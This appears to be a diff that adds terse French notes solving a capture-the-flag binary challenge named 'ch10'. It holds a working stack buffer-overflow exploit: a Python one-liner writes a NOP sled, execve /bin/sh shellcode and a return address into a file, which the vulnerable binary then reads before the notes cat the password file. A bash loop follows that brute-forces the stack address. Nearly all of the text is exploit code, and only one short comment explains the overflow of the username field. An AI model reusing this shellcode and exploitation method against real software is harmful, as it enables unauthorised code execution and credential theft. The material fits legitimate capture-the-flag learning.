@@ -1,0 +1,7 @@
+python -c "import sys; sys.stdout.write('USERNAME=' + '\x90'*50 + '\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\x90'*48 + '\x08\xb0\x04\x08' + '\x64\xfa\xff\xbf'*9)" > /tmp/file && ./ch10 /tmp/file
+cat .passwd
+
+on overflow le champ username dans la structure, ce qui nous permet d'avoir le controle d'eip, mais il faut faire attention a laisser le pointeur file intact (autrement segfault dans fgets ou fclose).
+
+trouver l'offset gdb/real :
+for i in {0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f}; do for x in {0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f}; do python -c "import sys; sys.stdout.write('USERNAME=' + '\x90'*50 + '\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\x90'*48 + '\x08\xb0\x04\x08' + '\x$i$x\xfa\xff\xbf'*9)" > /tmp/file ; echo $i $x ; ./ch10 /tmp/file ; done ; done
